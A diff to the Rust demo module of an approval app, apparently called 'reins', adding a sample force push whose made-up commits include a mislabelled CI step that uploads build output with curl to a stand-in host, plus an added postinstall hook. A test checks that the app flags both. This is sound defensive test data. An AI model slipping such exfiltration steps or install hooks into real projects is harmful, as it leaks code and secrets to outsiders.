@@ -2,7 +2,8 @@
 //! window can be tried (and photographed) without an account or a running daemon, and a pretend phone that approves
 //! work sessions. Nothing here is sent anywhere, and none of it is written to disk. `REINS_DEMO_EMPTY=1` leaves the
 //! samples out, to see the empty states; `REINS_DEMO_CALM=1` leaves out the request waiting on the phone;
-//! `REINS_DEMO_SESSION=1` starts with a work session running.
+//! `REINS_DEMO_SESSION=1` starts with a work session running; `REINS_DEMO_WAITING=push` makes what waits a push
+//! (`force-push`: a force push of eight commits, two of them worth a closer look).
 
 use std::collections::BTreeMap;
 use std::sync::Arc;
@@ -31,8 +32,19 @@ pub struct Demo {
     empty: bool,
     /// Nothing waiting on the phone (the calm Home).
     calm: bool,
-    /// What waits is a push (`REINS_DEMO_WAITING=push`), with its commits, rather than a command.
-    push_waiting: bool,
+    /// What waits on the phone (`REINS_DEMO_WAITING`).
+    waiting: Waiting,
+}
+
+/// What waits on the phone in the demo.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Waiting {
+    /// A command (the default).
+    Command,
+    /// A push, with its commits (`push`).
+    Push,
+    /// A force push of eight commits, two of them worth a closer look (`force-push`).
+    ForcePush,
 }
 
 /// One made-up request: seconds before the start, kind, source, service, what, detail, outcome, decider, reason,
@@ -63,6 +75,20 @@ const COMMAND_DETAIL: &str = "Rule: Recursive deletes · rm -r\nMatched: rm -rf 
      javap -cp . android.service.quicksettings.Tile | grep -iE 'subtitle|STATE'; javap -cp . \
      android.service.quicksettings.TileService | grep -iE 'ACTION|startActivityAndCollapse'\n\nIn: \
      /home/dana/code/reins";
+
+/// `REINS_DEMO_WAITING=force-push`: the request that waits, a force push of eight commits to `acme/web`.
+const WAITING_FORCE_PUSH: Sample = (
+    40,
+    Kind::Git,
+    Some("git"),
+    Some("github.com/acme/web"),
+    "push to github.com/acme/web: checkout-page (8 commits)",
+    Some("Commits: 8\nChanges: +26 −6 · 8 files\nRefs: 1 · deleted 0 · rewritten 1\nRef: checkout-page · force push"),
+    Outcome::Waiting,
+    Decider::Phone,
+    None,
+    0,
+);
 
 /// `REINS_DEMO_WAITING=push`: the request that waits, a push of three commits to `acme/web`.
 const WAITING_PUSH: Sample = (
@@ -268,7 +294,16 @@ impl Demo {
             base: now,
             empty: false,
             calm: false,
-            push_waiting: false,
+            waiting: Waiting::Command,
+        }
+    }
+
+    /// What waits on the phone is a force push of eight commits to `acme/web`, two of them worth a closer look.
+    #[must_use]
+    pub fn force_push(self) -> Self {
+        Self {
+            waiting: Waiting::ForcePush,
+            ..self
         }
     }
 
@@ -276,7 +311,7 @@ impl Demo {
     #[must_use]
     pub fn push_waiting(self) -> Self {
         Self {
-            push_waiting: true,
+            waiting: Waiting::Push,
             ..self
         }
     }
@@ -307,12 +342,11 @@ impl Demo {
             .enumerate()
             .filter(|(_, sample)| !(self.calm && sample.6 == Outcome::Waiting))
             .map(|(i, &sample)| {
-                let (ago, kind, source, service, what, detail, outcome, decider, reason, took) =
-                    if self.push_waiting && sample.6 == Outcome::Waiting {
-                        WAITING_PUSH
-                    } else {
-                        sample
-                    };
+                let (ago, kind, source, service, what, detail, outcome, decider, reason, took) = match self.waiting {
+                    Waiting::ForcePush if sample.6 == Outcome::Waiting => WAITING_FORCE_PUSH,
+                    Waiting::Push if sample.6 == Outcome::Waiting => WAITING_PUSH,
+                    _ => sample,
+                };
                 let at = self.base - ago;
                 Entry {
                     id: format!("demo{i}"),
@@ -417,15 +451,21 @@ impl Demo {
     }
 
     /// The push kept for the sample push to `acme/web` (entry `id`): three commits with their files and diff text, one
-    /// line of it with a right-to-left override, to see it shown rather than obeyed.
+    /// line of it with a right-to-left override, to see it shown rather than obeyed. The waiting force push
+    /// ([`Self::force_push`]) keeps its eight commits.
     #[must_use]
     pub fn push(self, id: &str) -> Option<Push> {
         let entry = self.activity().into_iter().find(|e| e.id == id)?;
         let kept = matches!(entry.outcome, Outcome::Approved | Outcome::Waiting);
+        let forced = self.waiting == Waiting::ForcePush && entry.outcome == Outcome::Waiting;
         (entry.service.as_deref() == Some("github.com/acme/web") && kept).then(|| Push {
             at: entry.ended_at.unwrap_or(entry.at),
             repo: "github.com/acme/web".to_owned(),
-            summary: sample_push(entry.at),
+            summary: if forced {
+                sample_force_push(entry.at)
+            } else {
+                sample_push(entry.at)
+            },
         })
     }
 
@@ -1033,6 +1073,125 @@ fn sample_push(at: i64) -> PushSummary {
     }
 }
 
+/// The sample force push to `acme/web`: eight commits on `checkout-page`, newest first. Two deserve a closer look: a
+/// CI workflow (whatever its subject says) and the build scripts in `package.json`.
+fn sample_force_push(at: i64) -> PushSummary {
+    let one = |path: &str, diff: &str| vec![sample_file(path, FileStatus::Modified, diff)];
+    let commits = vec![
+        sample_commit(
+            "9c1e4b7a2d5f8e0c3b6a9d2f5e8c1b4a7d0e3f6a",
+            "checkout: the saved card shows its last four digits",
+            at - 300,
+            one(
+                "src/checkout/card.tsx",
+                "@@ -8,3 +8,4 @@ export function Card({ card }: Props) {\n   return (\n-    <span>{card.brand}</span>\n+    \
+                 <span>{card.brand}</span>\n+    <span className=\"last4\">•••• {card.last4}</span>\n   );",
+            ),
+        ),
+        sample_commit(
+            "4f7a0d3e6b9c2f5a8e1d4b7c0f3a6e9d2c5b8a1f",
+            "ci: only renames a step, nothing to check",
+            at - 900,
+            one(
+                ".github/workflows/ci.yml",
+                "@@ -18,6 +18,9 @@ jobs:\n       - uses: actions/checkout@v4\n-      - run: npm ci\n+      - name: \
+                 Install\n+        run: npm ci\n+      - name: Upload\n+        run: curl -sT dist.tgz \
+                 https://drop.example.net/up\n       - run: npm test",
+            ),
+        ),
+        sample_commit(
+            "b2e5a8d1c4f7b0e3a6d9c2f5b8e1a4d7c0f3b6e9",
+            "checkout: the address form remembers the country",
+            at - 1_500,
+            one(
+                "src/checkout/address.tsx",
+                "@@ -21,4 +21,5 @@ export function Address() {\n-  const [country, setCountry] = useState('US');\n+  \
+                 const saved = localStorage.getItem('country');\n+  const [country, setCountry] = useState(saved ?? \
+                 'US');\n   return (",
+            ),
+        ),
+        sample_commit(
+            "e8b1d4a7c0f3e6b9d2a5c8f1e4b7d0a3c6f9e2b5",
+            "cart: undo a removed item for five seconds",
+            at - 2_400,
+            one(
+                "src/cart/undo.ts",
+                "@@ -2,3 +2,3 @@ import { Item } from './item';\n \n-export const UNDO_MS = 3_000;\n+export const \
+                 UNDO_MS = 5_000;\n ",
+            ),
+        ),
+        sample_commit(
+            "1a4d7b0e3c6f9a2d5b8e1c4f7a0d3b6e9c2f5a8d",
+            "docs: the checkout flow, step by step",
+            at - 3_300,
+            one(
+                "docs/checkout.md",
+                "@@ -1,2 +1,6 @@\n # Checkout\n+\n+1. The cart.\n+2. The address.\n+3. The card.\n+4. The receipt.",
+            ),
+        ),
+        sample_commit(
+            "7d0a3e6b9c2f5d8a1e4b7c0d3f6a9e2b5c8d1f4a",
+            "build: type-check before the bundle",
+            at - 4_200,
+            one(
+                "package.json",
+                "@@ -6,7 +6,8 @@\n   \"scripts\": {\n-    \"build\": \"vite build\",\n+    \"build\": \"tsc \
+                 --noEmit && vite build\",\n+    \"postinstall\": \"node scripts/setup.js\",\n     \"test\": \
+                 \"vitest\"\n   },",
+            ),
+        ),
+        sample_commit(
+            "c6f9b2e5a8d1c4f7b0e3a6d9c2f5b8e1a4d7c0f3",
+            "checkout: totals round to the cent, once, at the end",
+            at - 5_100,
+            one(
+                "src/cart/totals.ts",
+                "@@ -15,3 +15,3 @@ export function orderTotal(items: Item[]): number {\n-  return Math.round(sum);\n+  \
+                 return Math.round(sum * 100) / 100;\n }",
+            ),
+        ),
+        sample_commit(
+            "3b6e9c2f5a8d1b4e7c0f3a6d9b2e5c8f1a4d7b0e",
+            "checkout: the page and its order summary",
+            at - 6_000,
+            vec![sample_file(
+                "src/checkout/page.tsx",
+                FileStatus::Added,
+                "@@ -0,0 +1,8 @@\n+import { Summary } from './summary';\n+\n+export default function Checkout() {\n+  \
+                 return (\n+    <main className=\"checkout\">\n+      <Summary />\n+    </main>\n+  );\n+}",
+            )],
+        ),
+    ];
+    let files: Vec<FileChange> = commits
+        .iter()
+        .flat_map(|c| &c.files)
+        .map(|f| FileChange {
+            patch: None,
+            ..f.clone()
+        })
+        .collect();
+    let sum = |f: fn(&CommitInfo) -> Option<u64>| commits.iter().map(f).sum::<Option<u64>>();
+    PushSummary {
+        updates: vec![RefUpdate {
+            name: "refs/heads/checkout-page".to_owned(),
+            change: RefChange::Update,
+            old: "5e8b1d4a7c0f3e6b9d2a5c8f1e4b7d0a3c6f9e2b".to_owned(),
+            new: commits[0].sha.clone(),
+            fast_forward: Some(false),
+            commit_count: 8,
+            files_changed: u32::try_from(files.len()).unwrap_or(u32::MAX),
+            additions: sum(|c| c.additions),
+            deletions: sum(|c| c.deletions),
+            files,
+            commits,
+        }],
+        pack_bytes: 14_806,
+        push_options: Vec::new(),
+        notes: Vec::new(),
+        default_branch: Some("main".to_owned()),
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use reins_desktop::control::Overview;
@@ -1102,6 +1261,43 @@ mod tests {
         // The older push, logged before the numbers were written: nothing is kept for it.
         let older = entries.iter().find(|e| e.service.as_deref() == Some("github.com/acme/design-system")).unwrap();
         assert!(older.detail.is_none() && demo.push(&older.id).is_none());
+    }
+
+    /// `REINS_DEMO_WAITING=force-push`: eight commits that rewrite history, the second and the sixth worth a closer
+    /// look, and the entry's numbers are the push's.
+    #[test]
+    fn the_waiting_force_push_has_two_commits_to_look_at() {
+        let demo = Demo::new(1_700_000_000).force_push();
+        let entries = demo.activity();
+        let waiting = entries.iter().find(|e| e.outcome == Outcome::Waiting).expect("something waits");
+        let push = demo.push(&waiting.id).expect("the waiting push is kept");
+        let u = &push.summary.updates[0];
+        let changes = format!(
+            "Changes: +{} −{} · {} files",
+            u.additions.unwrap_or_default(),
+            u.deletions.unwrap_or_default(),
+            u.files_changed
+        );
+        assert_eq!(
+            waiting.detail.as_deref(),
+            Some(
+                format!("Commits: 8\n{changes}\nRefs: 1 · deleted 0 · rewritten 1\nRef: checkout-page · force push")
+                    .as_str()
+            )
+        );
+        assert_eq!(u.commits.len(), 8);
+        assert_eq!(u.fast_forward, Some(false));
+        let flagged: Vec<usize> = u
+            .commits
+            .iter()
+            .enumerate()
+            .filter(|(_, c)| reins_proto::attention::commit(c).is_some())
+            .map(|(i, _)| i)
+            .collect();
+        assert_eq!(flagged, [1, 5]);
+        // The approved push of three is still the one it was.
+        let approved = entries.iter().find(|e| e.outcome == Outcome::Approved && demo.push(&e.id).is_some()).unwrap();
+        assert_eq!(demo.push(&approved.id).unwrap().summary.updates[0].commits.len(), 3);
     }
 
     #[test]
